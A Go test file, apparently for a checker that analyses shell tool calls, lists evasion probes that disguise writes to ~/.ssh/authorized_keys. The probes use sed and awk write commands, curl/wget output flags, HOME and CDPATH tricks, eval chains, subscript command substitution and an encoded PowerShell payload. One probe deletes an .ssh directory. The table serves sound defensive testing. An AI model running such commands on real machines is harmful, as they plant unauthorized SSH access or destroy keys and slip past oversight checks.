// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// SPDX-License-Identifier: Apache-2.0

package effects

import "testing"

// Reviewer-invalid probes U03, U14 and I11 are dropped (curl has no --opt=value form, -sow is not a
// write-out cluster, unset does not evaluate a subscript).
// review-9 boundary probes (claude:d4a4f3ed/s7-effects-review9). Frozen as rows with the invariant.
// M = /home/u/.ssh/authorized_keys, D = /home/u/.ssh. raLin cwd /home/u/proj, raLinHome cwd /home/u.
// real "/nowrite" = control that writes nothing protected (only logged).
var rv9cases = []rv7case{
	// ---- G: sed closed grammar ----
	{"rv9-G01 sed colon label then w", raLin, "", `sed -n ':a w /home/u/.ssh/authorized_keys' f`, rlAK},
	{"rv9-G02 sed b label then w", raLin, "", `sed -n 'b a w /home/u/.ssh/authorized_keys' f`, rlAK},
	{"rv9-G03 sed t label then w", raLin, "", `sed -n 't a w /home/u/.ssh/authorized_keys' f`, rlAK},
	{"rv9-G04 sed -i empty bsd", raLin, "", `sed -i '' 's/a/b/' /home/u/.ssh/authorized_keys`, rlAK},
	{"rv9-G05 sed --in-place=suffix", raLin, "", `sed --in-place=.bak 's/a/b/' /home/u/.ssh/authorized_keys`, rlAK},
	{"rv9-G06 sed -- then script", raLin, "", `sed -n -- 'w /home/u/.ssh/authorized_keys' f`, rlAK},
	{"rv9-G07 sed -s -- 1w", raLin, "", `sed -s -n -- '1w /home/u/.ssh/authorized_keys' f`, rlAK},
	{"rv9-G08 sed a text then w line", raLin, "", "sed 'a x\nw /home/u/.ssh/authorized_keys' f", rlAK},
	{"rv9-G09 sed i backslash newline", raLin, "", "sed 'i\\\nx\nw /home/u/.ssh/authorized_keys' f", rlAK},
	{"rv9-G10 sed brace w newline", raLin, "", "sed -n '/x/{p;w /home/u/.ssh/authorized_keys\n}' f", rlAK},
	{"rv9-G11 sed -E -i", raLin, "", `sed -E -i 's/(a)/b/' /home/u/.ssh/authorized_keys`, rlAK},
	{"rv9-G12 sed s M flag then w", raLin, "", `sed 's/a/b/Mw /home/u/.ssh/authorized_keys' f`, rlAK},
	{"rv9-G13 sed -e then file positional (control)", raLin, "", `sed -e p /home/u/.ssh/authorized_keys`, "/nowrite"},
	{"rv9-G14 sed -z in place", raLin, "", `sed -z -i 's/a/b/' /home/u/.ssh/authorized_keys`, rlAK},
	// ---- A: awk closed grammar ----
	{"rv9-A01 awk -W dump-variables", raLin, "", `awk -W dump-variables=/home/u/.ssh/authorized_keys 'BEGIN{}'`, rlAK},
	{"rv9-A02 awk -W posix then program", raLin, "", `awk -W posix 'BEGIN{print "k" > "/home/u/.ssh/authorized_keys"}'`, rlAK},
	{"rv9-A03 awk -W exec file", raLin, "", `awk -W exec p.awk f`, rdyn},
	{"rv9-A04 awk -- program", raLin, "", `awk -- 'BEGIN{print "k" > "/home/u/.ssh/authorized_keys"}'`, rlAK},
	{"rv9-A05 awk -v -- program", raLin, "", `awk -v x=1 -- '{print > "/home/u/.ssh/authorized_keys"}' f`, rlAK},
	{"rv9-A06 awk -Wposix fused", raLin, "", `awk -Wposix 'BEGIN{print "k" > "/home/u/.ssh/authorized_keys"}'`, rlAK},
	{"rv9-A07 awk -i inplace", raLin, "", `awk -i inplace '{print}' /home/u/.ssh/authorized_keys`, rlAK},
	{"rv9-A08 awk -e source", raLin, "", `awk -e 'BEGIN{print "k" > "/home/u/.ssh/authorized_keys"}'`, rlAK},
	{"rv9-A09 awk -W interactive program", raLin, "", `awk -W interactive 'BEGIN{printf "k" > "/home/u/.ssh/authorized_keys"}'`, rlAK},
	{"rv9-A10 awk read (control)", raLin, "", `awk -F: '{print $1}' /home/u/.ssh/authorized_keys`, "/nowrite"},
	// ---- U: curl / wget ----
	{"rv9-U01 curl --output-dir -o", raLin, "", `curl --output-dir /home/u/.ssh -o authorized_keys http://example.test/`, rlAK},
	{"rv9-U02 curl --output-dir -O", raLin, "", `curl --output-dir /home/u/.ssh -O http://example.test/authorized_keys`, rlAK},
	{"rv9-U04 curl -o then --output-dir", raLin, "", `curl -o authorized_keys --output-dir /home/u/.ssh http://example.test/`, rlAK},
	{"rv9-U05 wget -P", raLin, "", `wget -P /home/u/.ssh http://example.test/authorized_keys`, rlAK},
	{"rv9-U06 wget --directory-prefix=", raLin, "", `wget --directory-prefix=/home/u/.ssh http://example.test/authorized_keys`, rlAK},
	{"rv9-U07 curl -sw cluster", raLin, "", `curl -sw '%output{/home/u/.ssh/authorized_keys}k' http://example.test/`, rlAK},
	{"rv9-U08 curl -sSw fused", raLin, "", `curl -sSw'%output{/home/u/.ssh/authorized_keys}k' http://example.test/`, rlAK},
	{"rv9-U09 curl -D", raLin, "", `curl -D /home/u/.ssh/authorized_keys http://example.test/`, rlAK},
	{"rv9-U10 curl --hsts", raLin, "", `curl --hsts /home/u/.ssh/authorized_keys http://example.test/`, rlAK},
	{"rv9-U11 curl --expand-output", raLin, "", `curl --variable p=/home/u/.ssh/authorized_keys --expand-output '{{p}}' http://example.test/`, rlAK},
	{"rv9-U12 wget -o log", raLin, "", `wget -o /home/u/.ssh/authorized_keys http://example.test/`, rlAK},
	{"rv9-U13 wget -e wgetrc", raLin, "", `wget -e output_document=/home/u/.ssh/authorized_keys http://example.test/`, rlAK},
	// ---- I: inert-operand builtins ----
	{"rv9-I01 printf -v HOME", raLin, "", `printf -v HOME %s /home/u/.ssh; echo k >> ~/authorized_keys`, rlAK},
	{"rv9-I02 printf -v CDPATH", raLin, "", `printf -v CDPATH %s /home/u; cd .ssh; echo k >> authorized_keys`, rlAK},
	{"rv9-I03 OLDPWD cd -", raLin, "", `OLDPWD=/home/u/.ssh; cd - >/dev/null; echo k >> authorized_keys`, rlAK},
	{"rv9-I04 tilde minus", raLin, "", `OLDPWD=/home/u/.ssh; echo k >> ~-/authorized_keys`, rlAK},
	{"rv9-I05 cd then cd - back", raLin, "", `cd /home/u/.ssh; cd /tmp; cd - >/dev/null; echo k >> authorized_keys`, rlAK},
	{"rv9-I06 hash -p", raLin, "", `hash -p /usr/bin/tee cat; cat -a /home/u/.ssh/authorized_keys`, rlAK},
	{"rv9-I07 let subscript cmdsubst", raLin, "", `let 'x[$(echo k >> /home/u/.ssh/authorized_keys)]=1'`, rlAK},
	{"rv9-I08 test -v subscript", raLin, "", `test -v 'x[$(echo k >> /home/u/.ssh/authorized_keys)]'`, rlAK},
	{"rv9-I09 printf -v subscript", raLin, "", `printf -v 'x[$(echo k >> /home/u/.ssh/authorized_keys)]' %s 1`, rlAK},
	{"rv9-I10 read subscript", raLin, "", `read 'x[$(echo k >> /home/u/.ssh/authorized_keys)]' < /dev/null`, rlAK},
	{"rv9-I12 sh alias newline", raLin, "", "sh -c 'alias cat=\"tee -a\"\ncat /home/u/.ssh/authorized_keys'", rlAK},
	{"rv9-I13 expr (control)", raLin, "", `expr 1 + 1 > /dev/null`, "/nowrite"},
	// ---- X: export attribute and child env ----
	{"rv9-X01 export then reassign HOME", raLin, "", `export HOME; HOME=/home/u/.ssh; bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X02 declare -x HOME=", raLin, "", `declare -x HOME=/home/u/.ssh; bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X03 local HOME in function", raLin, "", `f() { local HOME=/home/u/.ssh; bash -c 'echo k >> ~/authorized_keys'; }; f`, rlAK},
	{"rv9-X04 export -n then export", raLin, "", `export -n HOME; export HOME; HOME=/home/u/.ssh; bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X05 prefix on export", raLin, "", `HOME=/home/u/.ssh export HOME; bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X06 unset then export=", raLin, "", `unset HOME; export HOME=/home/u/.ssh; bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X07 env -i HOME", raLin, "", `env -i HOME=/home/u/.ssh bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X08 +x then export sh cd", raLinHome, "", `declare +x HOME; export HOME; HOME=/home/u/.ssh; sh -c 'cd; echo k >> authorized_keys'`, rlAK},
	{"rv9-X09 nameref HOME", raLin, "", `declare -n r=HOME; r=/home/u/.ssh; echo k >> ~/authorized_keys`, rlAK},
	{"rv9-X10 HOME append", raLin, "", `HOME+=/.ssh; echo k >> ~/authorized_keys`, rlAK},
	{"rv9-X11 export HOME append child", raLin, "", `export HOME+=/.ssh; bash -c 'echo k >> ~/authorized_keys'`, rlAK},
	{"rv9-X12 declare -l HOME", raLin, "", `declare -l HOME=/HOME/U/.SSH; echo k >> ~/authorized_keys`, rlAK},
	{"rv9-X13 CDPATH append", raLin, "", `CDPATH=/x; CDPATH+=:/home/u; cd .ssh; echo k >> authorized_keys`, rlAK},
	{"rv9-X14 declare -x after assign", raLinHome, "", `HOME=/home/u/.ssh; declare -x HOME; sh -c 'cd; echo k >> authorized_keys'`, rlAK},
	// ---- N: per-frame narrowing ----
	{"rv9-N01 cd || brace eval", raLin, "", `cd /home/u/.ssh || { eval true; }; echo k >> authorized_keys`, rlAK},
	{"rv9-N02 cd && source && write", raLin, "", `cd /home/u/.ssh && source /dev/null && echo k >> authorized_keys`, rlAK},
	{"rv9-N03 cd fail || cd && eval && write", raLin, "", `cd /t/none || cd /home/u/.ssh && eval true && echo k >> authorized_keys`, rlAK},
	{"rv9-N04 function cd in && chain", raLin, "", `f() { cd /home/u/.ssh; }; true && f && echo k >> authorized_keys`, rlAK},
	{"rv9-N05 cd || exit then eval", raLin, "", `cd /home/u/.ssh || exit; eval true; echo k >> authorized_keys`, rlAK},
	{"rv9-N06 subshell fail || cd", raLin, "", `(cd /t/none) || cd /home/u/.ssh; eval :; echo k >> authorized_keys`, rlAK},
	{"rv9-N07 eval cd in && tail", raLin, "", `cd /home/u/.ssh && eval 'cd /tmp' || true; echo k >> authorized_keys`, "/tmp/authorized_keys"},
	{"rv9-N08 brace eval cd .. in && chain", raLin, "", `cd /home/u/.ssh && { eval 'cd ..'; } && echo k >> authorized_keys`, "/home/u/authorized_keys"},
	{"rv9-N09 eval cd && eval write", raLin, "", `eval 'cd /home/u/.ssh' && eval 'echo k >> authorized_keys'`, rlAK},
	{"rv9-N10 failed && eval cd", raLin, "", `cd /home/u/.ssh; cd /t/none && eval 'cd /tmp'; echo k >> authorized_keys`, rlAK},
	{"rv9-N11 pipeline cd (subshell)", raLin, "", `cd /home/u/.ssh | true; echo k >> authorized_keys`, "/home/u/proj/authorized_keys"},
	{"rv9-N12 eval defines fn in || tail", raLin, "", `cd /t/none || eval 'g() { cd /home/u/.ssh; }'; g; echo k >> authorized_keys`, rlAK},
	{"rv9-N13 source in && then cd ..", raLin, "", `cd /home/u/.ssh && . /dev/null && cd .. && echo k >> .ssh/authorized_keys`, rlAK},
	{"rv9-N14 nested eval eval", raLin, "", `cd /home/u/.ssh || eval 'eval true'; eval 'echo k >> authorized_keys'`, rlAK},
	{"rv9-N15 while cd", raLin, "", `while cd /home/u/.ssh; do break; done; echo k >> authorized_keys`, rlAK},
	{"rv9-N16 eval cd fail in ||", raLin, "", `cd /home/u/.ssh && eval 'cd /t/none' || eval true; echo k >> authorized_keys`, rlAK},
	{"rv9-N10a start in D, fail && eval cd", rv7LinSSH, "", `cd /t/none && eval 'cd /tmp'; echo k >> authorized_keys`, rlAK},
	{"rv9-N10b cd; fail && eval true", raLin, "", `cd /home/u/.ssh; cd /t/none && eval true; echo k >> authorized_keys`, rlAK},
	{"rv9-N10c cd; fail && cd (no eval)", raLin, "", `cd /home/u/.ssh; cd /t/none && cd /tmp; echo k >> authorized_keys`, rlAK},
	{"rv9-N10d cd; fail && brace cd", raLin, "", `cd /home/u/.ssh; cd /t/none && { cd /tmp; }; echo k >> authorized_keys`, rlAK},
	{"rv9-N10e cd; true && eval cd", raLin, "", `cd /home/u/.ssh; true && eval 'cd /tmp'; echo k >> authorized_keys`, "/tmp/authorized_keys"},
	{"rv9-N10f cd; fail || eval cd", raLin, "", `cd /home/u/.ssh; cd /t/none || eval 'cd /tmp'; echo k >> authorized_keys`, "/tmp/authorized_keys"},
	{"rv9-N10g cd; fail && sh-free fn cd", raLin, "", `g() { cd /tmp; }; cd /home/u/.ssh; cd /t/none && g; echo k >> authorized_keys`, rlAK},
	{"rv9-N10h cd; fail && eval cd && eval cd", raLin, "", `cd /home/u/.ssh; cd /t/none && eval 'cd /tmp' && eval 'cd /'; echo k >> authorized_keys`, rlAK},
	// ---- R: restricted-tier mis-fire checks (real writes elsewhere; a K| at a protected path = mis-fire) ----
	{"rv9-R01 declare -u HOME", raLin, "", `declare -u HOME=/home/u/.ssh; echo k >> ~/authorized_keys`, "/HOME/U/.SSH/authorized_keys"},
	{"rv9-R02 HOME += prefix", raLin, "", `HOME=/t; HOME+=/home/u; echo k >> ~/.bashrc`, "/t/home/u/.bashrc"},
	{"rv9-R03 curl --output-dir from .ssh", rv7LinSSH, "", `curl --output-dir /tmp -o authorized_keys http://example.test/`, "/tmp/authorized_keys"},
	{"rv9-R04 nameref HOME elsewhere", raLin, "", `declare -n r=HOME; r=/t/h; echo k >> ~/.bashrc`, "/t/h/.bashrc"},
	{"rv9-R05 prefix export HOME elsewhere", raLin, "", `HOME=/t/h export HOME; bash -c 'echo k >> ~/.bashrc'`, "/t/h/.bashrc"},
}

var rv9mcases = []rv7case{
	{"rv9-M01 B88 pwsh -wd -c", raLinPS, "", `pwsh -wd /home/u/.ssh -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M02 pwsh -WorkingDirectory -c", raLinPS, "", `pwsh -WorkingDirectory /home/u/.ssh -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M03 pwsh -wd -ec", raLinPS, "", `pwsh -wd /home/u/.ssh -ec QQBkAGQALQBDAG8AbgB0AGUAbgB0ACAAYQB1AHQAaABvAHIAaQB6AGUAZABfAGsAZQB5AHMAIABrAA==`, rlAK},
	{"rv9-M04 pwsh -NoProfile -wd -c", raLinPS, "", `pwsh -NoProfile -wd /home/u/.ssh -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M05 win powershell -wd -c", raPS, "", `powershell -wd C:\Users\u\.ssh -c 'Add-Content authorized_keys k'`, rwAK},
	{"rv9-M06 cmd pwsh -wd -c", raCmd, "", `pwsh -wd C:\Users\u\.ssh -c "Add-Content authorized_keys k"`, rwAK},
	{"rv9-M07 posix pwsh -wd -c", raLin, "", `pwsh -wd /home/u/.ssh -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M08 pwsh -wd rel -c", raLinPS, "", `pwsh -wd ../.ssh -c 'Add-Content authorized_keys k'`, "/home/u/.ssh/authorized_keys"},
	{"rv9-M09 pwsh -wd dot -c abs", raLinPS, "", `pwsh -wd . -c 'Add-Content /home/u/.ssh/authorized_keys k'`, rlAK},
	{"rv9-M10 pwsh -wd -c Set-Location inside", raLinPS, "", `pwsh -wd /tmp -c 'Add-Content ./authorized_keys k'`, "/tmp/authorized_keys"},
	{"rv9-M11 S5 powershell positional", raPS, "", `powershell Remove-Item -Recurse C:\Users\u\.ssh`, "c:\\users\\u\\.ssh"},
	{"rv9-M12 pwsh -wd dir/. rel", raLinPS, "", `pwsh -wd /home/u/.ssh/. -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M13 pwsh -WorkingDirectory dir/. rel", raLinPS, "", `pwsh -WorkingDirectory /home/u/.ssh/. -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M14 pwsh -wd dir/ rel", raLinPS, "", `pwsh -wd /home/u/.ssh/ -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M15 pwsh -wd .ssh/. rel", raLinPS, "", `pwsh -wd .ssh/. -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M16 win powershell -wd dir-bs-dot rel", raPS, "", `powershell -wd C:\Users\u\.ssh\. -c 'Add-Content authorized_keys k'`, rwAK},
	{"rv9-M17 pwsh -wd dir/echo rel", raLinPS, "", `pwsh -wd /home/u/.ssh/../.ssh/. -c 'Set-Content authorized_keys k'`, rlAK},
	{"rv9-M18 posix bash pwsh -wd dir/.", raLin, "", `pwsh -wd /home/u/.ssh/. -c 'Add-Content authorized_keys k'`, rlAK},
	{"rv9-M19 pwsh -wd dot rel (control)", raLinPS, "", `pwsh -wd . -c 'Add-Content authorized_keys k'`, "/home/u/authorized_keys"},
}

func TestReview9ProbeTable(t *testing.T) {
	for _, set := range [][]rv7case{rv9cases, rv9mcases} {
		for _, c := range set {
			real := c.real
			if real == "/nowrite" {
				real = "" // a control that writes nothing protected: verdict frozen only
			}
			checkRow(t, c.id, c.o, Call{Surface: SurfaceShell, Command: c.cmd, Workdir: c.wd}, real)
		}
	}
}
